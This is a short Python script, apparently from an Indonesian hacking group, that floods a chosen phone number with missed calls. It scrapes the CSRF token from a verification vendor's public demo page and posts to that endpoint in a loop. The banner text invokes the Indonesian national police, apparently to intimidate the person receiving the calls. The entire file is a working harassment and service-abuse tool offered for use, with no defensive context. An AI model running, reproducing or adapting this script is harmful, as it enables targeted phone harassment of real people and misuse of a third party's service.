#Xractz
#IndoSec

import time, re, sys
from requests import Session
s = Session()

print("Tools Call Random-Mabes Polri\nDelay 3 Min\nUses Country Code Extension(ex: 62xxxxx29)")
try:
	no = int(input("No    : "))
	jml = int(input("Count : "))
	print()
except:
	print("\n\t* Only Number *")
	sys.exit()
	
url = "https://www.citcall.com/demo/misscallapi.php"

tkn = s.get(url).text
token = re.findall(r'id="csrf_token" value="(.*?)">', tkn)[0]

headers = {
	'x-requested-with':'XMLHttpRequest'
}
data = {
'cid':no,
'trying':'0',
'csrf_token':token
}

n = 0
try:
	while n < jml:
		send = s.post(url, data=data, headers=headers).text
		time.sleep(4.8)
		if 'Success' in send:
			n +=1
			print(f"[{n}] Sended To => {no}")
		else:
			print("\n\t* Limit *")
			print("\n\t* BUSY SERVER -34892894 DIVPOLRI *")
			break
except:
	print("\n\t* ERROR *")
	sys.exit()
